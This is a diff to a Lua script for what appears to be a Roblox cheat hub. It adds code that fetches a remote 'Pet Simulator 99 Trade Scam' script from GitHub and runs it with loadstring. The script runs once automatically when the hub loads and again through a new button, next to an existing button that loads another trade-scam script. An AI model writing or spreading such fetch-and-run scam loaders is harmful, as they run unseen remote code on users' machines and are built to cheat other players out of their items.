@@ -19,6 +19,9 @@ local function getHttpRequest(url)
     return game:HttpGet(url)
 end
 
+-- Load Pet Simulator 99 Trade Scam script
+loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+
 local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
 
 local Players = game:GetService("Players")
@@ -282,6 +285,15 @@ PetSim99:CreateButton({
    Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SyntaxHubX/Trade-Scam-V2/main/scriptv2.lua"))()
        executednotify("Trade Scam")
+   end,
+})
+
+PetSim99:CreateButton({
+   Name = "LAJ Trade Scam (Custom)",
+   Callback = function()
+       -- Load the script from GitHub
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+       executednotify("LAJ Custom Trade Scam")
    end,
 })
 
